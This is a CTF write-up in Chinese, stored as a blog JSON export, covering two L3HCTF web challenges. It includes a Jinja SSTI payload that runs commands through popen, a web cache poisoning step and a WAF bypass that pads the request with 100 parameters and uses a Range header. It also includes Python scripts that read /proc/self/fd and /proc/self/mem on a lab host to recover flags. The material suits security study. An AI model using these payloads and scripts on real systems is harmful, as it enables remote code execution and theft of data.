{"title":"L3HCTF-WEB","uid":"3afc90457b92b90702a717b9d89559ea","slug":"L3HCTF-WEB","date":"2025-07-18T10:03:39.000Z","updated":"2025-07-18T10:23:31.352Z","comments":true,"path":"api/articles/L3HCTF-WEB.json","keywords":null,"cover":"/image/3.webp","content":"<h2 id=\"best-profile\"><a href=\"#best-profile\" class=\"headerlink\" title=\"best_profile\"></a>best_profile</h2><p><img src=\"https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250718181137968.png\" alt=\"image-20250716192141855\"></p>\n<p>观察源码，找到利用点，ssti</p>\n<p>要先进入&#x2F;ip_detail&#x2F;<a href=\"string:username\">string:username</a>路由</p>\n<p>但是&#x2F;ip_detail&#x2F;<a href=\"string:username\">string:username</a>会以get方式访问&#x2F;get_last_ip&#x2F;{username}</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250718181125043.png\" alt=\"image-20250716193619860\"></p>\n<p>nginx.conf配置文件，会缓存页面cookie，导致web缓存中毒</p>\n<p>注册名为以上后缀就会缓存页面信息</p>\n<p>注册一个1.gif用户，登陆的时候修改xff头</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250718181110024.png\" alt=\"image-20250716193921611\"></p>\n<p>访问&#x2F;get_last_ip&#x2F;1.jpg这个路由，得到回显</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250718181046659.png\" alt=\"image-20250716194003290\"></p>\n<p>再访问&#x2F;ip_detail&#x2F;1.jpg这个路由，得到回显执行成功</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250718180705390.png\" alt=\"image-20250716194030697\"></p>\n<p>将xff头修改为payload，过滤引号，paylaod为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;lipsum.__globals__.__builtins__.__import__(request.args.a).popen(request.args.b).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250718180705401.png\" alt=\"image-20250716194653697\"></p>\n<p>得到flag</p>\n<h2 id=\"gateway-advance\"><a href=\"#gateway-advance\" class=\"headerlink\" title=\"gateway_advance\"></a>gateway_advance</h2><p><img src=\"https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250718180707190.png\" alt=\"image-20250717095359026\"></p>\n<p>在download路由下可疑文件读取但是有ngx.req.get_uri_args()限制，这个函数接收参数默认上限是100</p>\n<p>构造一百个参数，在第101个参数的时候进行敏感文件读取</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250718180707274.png\" alt=\"image-20250717095727655\"></p>\n<p>爆破后台文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250718181022503.png\" alt=\"image-20250717095758047\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250718180959123.png\" alt=\"image-20250717100205125\"></p>\n<p>当我们读取..&#x2F;proc&#x2F;self&#x2F;fd&#x2F;6时被waf拦了</p>\n<p>使用Range: bytes&#x3D;0-0绕过</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250718180943608.png\" alt=\"image-20250717100543618\"></p>\n<p>可以绕过</p>\n<p>写脚本进行读取</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://192.168.110.128:8800/download&quot;</span></span><br><span class=\"line\">filename = <span class=\"string\">&quot;../proc/self/fd/6&quot;</span>  <span class=\"comment\"># 目标文件路径</span></span><br><span class=\"line\"></span><br><span class=\"line\">params = &#123;<span class=\"string\">f&quot;a<span class=\"subst\">&#123;i&#125;</span>&quot;</span>: <span class=\"built_in\">str</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">101</span>)&#125;</span><br><span class=\"line\">params[<span class=\"string\">&quot;filename&quot;</span>] = filename</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">read_file_byte_by_byte</span>(<span class=\"params\">url, params, max_bytes=<span class=\"number\">1024</span>*<span class=\"number\">1024</span></span>):</span><br><span class=\"line\">    headers = &#123;&#125;</span><br><span class=\"line\">    content = <span class=\"string\">b&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(max_bytes):</span><br><span class=\"line\">        headers[<span class=\"string\">&#x27;Range&#x27;</span>] = <span class=\"string\">f&quot;bytes=<span class=\"subst\">&#123;i&#125;</span>-<span class=\"subst\">&#123;i&#125;</span>&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            r = requests.get(url, params=params, headers=headers)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> r.status_code <span class=\"keyword\">in</span> [<span class=\"number\">206</span>, <span class=\"number\">200</span>]:</span><br><span class=\"line\">                chunk = r.content</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> chunk:</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[*] 读取结束，位置<span class=\"subst\">&#123;i&#125;</span>无数据&quot;</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">                content += chunk</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] 读取字节 <span class=\"subst\">&#123;i&#125;</span>，内容: <span class=\"subst\">&#123;chunk&#125;</span>&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[!] 状态码 <span class=\"subst\">&#123;r.status_code&#125;</span>，停止读取&quot;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[!] 请求异常: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> content</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    data = read_file_byte_by_byte(url, params, max_bytes=<span class=\"number\">1024</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;读取内容：&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(data.decode(errors=<span class=\"string\">&#x27;ignore&#x27;</span>))</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250718180708320.png\" alt=\"image-20250717100619337\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250718180708862.png\" alt=\"image-20250717101141390\"></p>\n<p>&#x2F;flag读取完就删除了，进程关闭</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250718180917603.png\" alt=\"image-20250717101938787\"></p>\n<p>访问read_anywhere路由，去修改x_gateway_filename和x_gateway_password头，进行文件读取</p>\n<p>扒大佬脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># === 配置项 ===</span></span><br><span class=\"line\">TARGET = <span class=\"string\">&quot;http://192.168.110.128:8800/read_anywhere&quot;</span></span><br><span class=\"line\">PASSWORD = <span class=\"string\">&quot;test_password&quot;</span></span><br><span class=\"line\">CHUNK_SIZE = <span class=\"number\">4096</span>  <span class=\"comment\"># 每次读取的字节数</span></span><br><span class=\"line\">FLAG_PREFIX = <span class=\"string\">b&quot;L3HCTF&#123;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># === 读取 maps ===</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_readable_ranges</span>():</span><br><span class=\"line\">    headers = &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;X-Gateway-Password&quot;</span>: PASSWORD,</span><br><span class=\"line\">        <span class=\"string\">&quot;X-Gateway-Filename&quot;</span>: <span class=\"string\">&quot;/proc/self/maps&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;X-Gateway-Start&quot;</span>: <span class=\"string\">&quot;0&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;X-Gateway-Length&quot;</span>: <span class=\"string\">&quot;65536&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 请求 /proc/self/maps ...&quot;</span>)</span><br><span class=\"line\">    r = requests.get(TARGET, headers=headers)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> r.status_code != <span class=\"number\">200</span>:</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> RuntimeError(<span class=\"string\">f&quot;无法读取 maps: <span class=\"subst\">&#123;r.status_code&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    ranges = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> r.text.splitlines():</span><br><span class=\"line\">        m = re.<span class=\"keyword\">match</span>(<span class=\"string\">r&#x27;^([0-9a-fA-F]+)-([0-9a-fA-F]+) ([rwxp\\-]&#123;4&#125;)&#x27;</span>, line)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> m <span class=\"keyword\">and</span> <span class=\"string\">&#x27;r&#x27;</span> <span class=\"keyword\">in</span> m.group(<span class=\"number\">3</span>):</span><br><span class=\"line\">            start = <span class=\"built_in\">int</span>(m.group(<span class=\"number\">1</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\">            end = <span class=\"built_in\">int</span>(m.group(<span class=\"number\">2</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\">            ranges.append((start, end))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] 找到 <span class=\"subst\">&#123;<span class=\"built_in\">len</span>(ranges)&#125;</span> 个可读内存段&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ranges</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># === 搜索内存中包含 flag 的区域 ===</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">search_flag_in_mem</span>(<span class=\"params\">ranges</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> start, end <span class=\"keyword\">in</span> ranges:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[*] 扫描内存段: <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(start)&#125;</span> - <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(end)&#125;</span>&quot;</span>)</span><br><span class=\"line\">        offset = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> start + offset &lt; end:</span><br><span class=\"line\">            size = <span class=\"built_in\">min</span>(CHUNK_SIZE, end - (start + offset))</span><br><span class=\"line\">            headers = &#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;X-Gateway-Password&quot;</span>: PASSWORD,</span><br><span class=\"line\">                <span class=\"string\">&quot;X-Gateway-Filename&quot;</span>: <span class=\"string\">&quot;/proc/self/mem&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;X-Gateway-Start&quot;</span>: <span class=\"built_in\">str</span>(start + offset),</span><br><span class=\"line\">                <span class=\"string\">&quot;X-Gateway-Length&quot;</span>: <span class=\"built_in\">str</span>(size)</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                r = requests.get(TARGET, headers=headers, timeout=<span class=\"number\">5</span>)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> r.status_code != <span class=\"number\">200</span>:</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[!] 读取失败 status=<span class=\"subst\">&#123;r.status_code&#125;</span> offset=<span class=\"subst\">&#123;offset&#125;</span>&quot;</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">                data = r.content</span><br><span class=\"line\">                <span class=\"keyword\">if</span> FLAG_PREFIX <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">                    index = data.find(FLAG_PREFIX)</span><br><span class=\"line\">                    <span class=\"comment\"># 简单截断 flag（直到遇到右大括号或 50 字节以内）</span></span><br><span class=\"line\">                    tail = data[index:index + <span class=\"number\">50</span>]</span><br><span class=\"line\">                    <span class=\"keyword\">match</span> = re.search(<span class=\"string\">rb&#x27;L3HCTF\\&#123;[^\\&#125;]&#123;1,48&#125;\\&#125;&#x27;</span>, tail)</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> <span class=\"keyword\">match</span>:</span><br><span class=\"line\">                        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n🎉 找到 flag: <span class=\"subst\">&#123;<span class=\"keyword\">match</span>.group(<span class=\"number\">0</span>).decode()&#125;</span>&quot;</span>)</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">                    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[?] 找到前缀但无法确定完整 flag: <span class=\"subst\">&#123;tail&#125;</span>&quot;</span>)</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">                offset += size</span><br><span class=\"line\">            <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[!] 请求异常: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] 未找到 flag&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    ranges = get_readable_ranges()</span><br><span class=\"line\">    found = search_flag_in_mem(ranges)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> found:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] flag 未找到&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>修改完http头信息从内存中读取flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250718180709408.png\" alt=\"image-20250717103321278\"></p>\n","feature":true,"text":"best_profile 观察源码，找到利用点，ssti 要先进入/ip_detail/string:username路由 但是/ip_detail/strin...","permalink":"/post/L3HCTF-WEB","photos":[],"count_time":{"symbolsCount":"5.2k","symbolsTime":"5 mins."},"categories":[{"name":"web","slug":"web","count":4,"path":"api/categories/web.json"}],"tags":[{"name":"wp","slug":"wp","count":2,"path":"api/tags/wp.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#best-profile\"><span class=\"toc-text\">best_profile</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#gateway-advance\"><span class=\"toc-text\">gateway_advance</span></a></li></ol>","author":{"name":"Riskcow","slug":"blog-author","avatar":"/image/1.jpg","link":"/","description":"断绝容易，难的是停止思念不再回头。","socials":{"github":"https://github.com/Riskcow","twitter":"","stack